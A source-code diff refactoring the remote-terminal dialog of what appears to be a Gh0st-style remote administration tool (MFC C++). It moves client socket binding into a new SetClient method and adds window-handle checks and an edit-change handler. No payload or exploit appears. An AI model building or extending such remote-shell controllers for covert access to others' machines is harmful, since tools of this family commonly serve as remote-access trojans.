@@ -11,12 +11,10 @@
 
 IMPLEMENT_DYNAMIC(ShellDlg, CDialogEx)
 
-ShellDlg::ShellDlg(CWnd* pParent,CIOCPServer* pIOCPServer, ClientContext *pContext)
+ShellDlg::ShellDlg(CWnd* pParent)
 	: CDialogEx(ShellDlg::IDD, pParent)
 {
-	m_iocpServer	= pIOCPServer;
-	m_pContext		= pContext;
-	m_nCurSel = 0;
+	
 }
 
 ShellDlg::~ShellDlg()
@@ -53,6 +51,8 @@ void ShellDlg::OnSize(UINT nType, int cx, int cy)
 	CDialogEx::OnSize(nType, cx, cy);
 
 	// TODO: 在此处添加消息处理程序代码
+	if (this->m_hWnd == NULL)
+		return;
 	RECT	rectClient;
 	RECT	rectEdit;
 	GetClientRect(&rectClient);
@@ -60,6 +60,8 @@ void ShellDlg::OnSize(UINT nType, int cx, int cy)
 	rectEdit.top = 0;
 	rectEdit.right = rectClient.right;
 	rectEdit.bottom = rectClient.bottom;
+	if (m_edit.m_hWnd == NULL)
+		return;
 	m_edit.MoveWindow(&rectEdit);
 }
 
@@ -69,21 +71,11 @@ BOOL ShellDlg::OnInitDialog()
 	CDialogEx::OnInitDialog();
 
 	// TODO:  在此添加额外的初始化
-	m_nCurSel = m_edit.GetWindowTextLength();
-
-	CString str;
-	sockaddr_in  sockAddr;
-	memset(&sockAddr, 0, sizeof(sockAddr));
-	int nSockAddrLen = sizeof(sockAddr);
-	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-	str.Format(_T("\\\\%s - 远程终端"), bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
-	SetWindowText(str);
+	
 
 	m_edit.SetLimitText(MAXDWORD); // 设置最大长度
 
-	// 通知远程控制端对话框已经打开
-	BYTE bToken = COMMAND_NEXT;
-	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+	
 	return TRUE;  // return TRUE unless you set the focus to a control
 	// 异常: OCX 属性页应返回 FALSE
 }
@@ -162,4 +154,40 @@ void ShellDlg::AddKeyBoardData()
 	m_edit.SetSel(len, len);
 	m_edit.ReplaceSel(strResult);
 	m_nCurSel = m_edit.GetWindowTextLength();
+}
+void ShellDlg::OnChangeEdit() 
+{
+	// TODO: If this is a RICHEDIT control, the control will not
+	// send this notification unless you override the CDialog::OnInitDialog()
+	// function and call CRichEditCtrl().SetEventMask()
+	// with the ENM_CHANGE flag ORed into the mask.
+
+	// TODO: Add your control notification handler code here
+	// 用户删除了部分内容，改变m_nCurSel
+	int len = m_edit.GetWindowTextLength();
+	if (len < m_nCurSel)
+		m_nCurSel = len;
+}
+
+BOOL ShellDlg::SetClient(CIOCPServer* pIOCPServer , ClientContext *pContext )
+{
+	m_iocpServer	= pIOCPServer;
+	m_pContext		= pContext;
+	m_nCurSel = 0;
+
+	m_nCurSel = m_edit.GetWindowTextLength();
+
+	CString str;
+	sockaddr_in  sockAddr;
+	memset(&sockAddr, 0, sizeof(sockAddr));
+	int nSockAddrLen = sizeof(sockAddr);
+	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
+	str.Format(_T("\\\\%s - 远程终端"), bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
+	SetWindowText(str);
+
+
+	// 通知远程控制端对话框已经打开
+	BYTE bToken = COMMAND_NEXT;
+	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+	return TRUE;
 }
